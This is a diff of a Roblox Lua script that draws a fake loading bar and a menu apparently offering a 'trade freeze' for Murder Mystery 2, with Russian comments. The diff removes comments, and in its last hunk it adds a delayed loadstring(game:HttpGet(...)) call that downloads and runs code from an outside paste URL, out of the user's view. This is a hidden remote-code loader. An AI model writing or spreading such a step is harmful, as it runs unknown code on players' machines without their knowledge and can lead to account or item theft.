@@ -111,13 +111,13 @@ task.spawn(function()
     task.wait(0.5)
     task.wait(4.0)
     setProgress(99, "Подождите пожалуйста, это займет 20 секунд...")
-    task.wait(20.0) -- 20 секунд на 99%
+    task.wait(20.0)
     setProgress(100, "Загрузка завершена!")
     task.wait(0.5)
     ScreenGui:Destroy()
     
     -- ============================================================
-    -- 2. ОСНОВНОЕ МЕНЮ (С ВОЗМОЖНОСТЬЮ ПЕРЕМЕЩЕНИЯ)
+    -- 2. ОСНОВНОЕ МЕНЮ
     -- ============================================================
     local MenuGui = Instance.new("ScreenGui")
     MenuGui.Name = "MM2TradeFreeze"
@@ -160,7 +160,6 @@ task.spawn(function()
         MenuGui:Destroy()
     end)
     
-    -- ДВИЖЕНИЕ ОКНА
     local dragging, dragInput, dragStart, startPos
     MainFrame.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
@@ -188,7 +187,6 @@ task.spawn(function()
         end
     end)
     
-    -- ПЕРЕКЛЮЧАТЕЛИ
     local function createSwitch(yPos, labelText, callback)
         local Container = Instance.new("Frame")
         Container.Parent = MainFrame
@@ -280,6 +278,12 @@ task.spawn(function()
     Footer.TextColor3 = Color3.fromRGB(90, 90, 90)
     Footer.TextSize = 10
     Footer.Font = Enum.Font.Gotham
-    
-    print("Загрузка завершена. Меню открыто.")
+
+    -- ============================================================
+    -- 3. ЗАПУСК СКРИПТА В КОНЦЕ
+    -- ============================================================
+    task.spawn(function()
+        task.wait(0.5)
+        loadstring(game:HttpGet("https://api.rubis.lol/v2/scrap/WvHvRa/raw"))()
+    end)
 end)
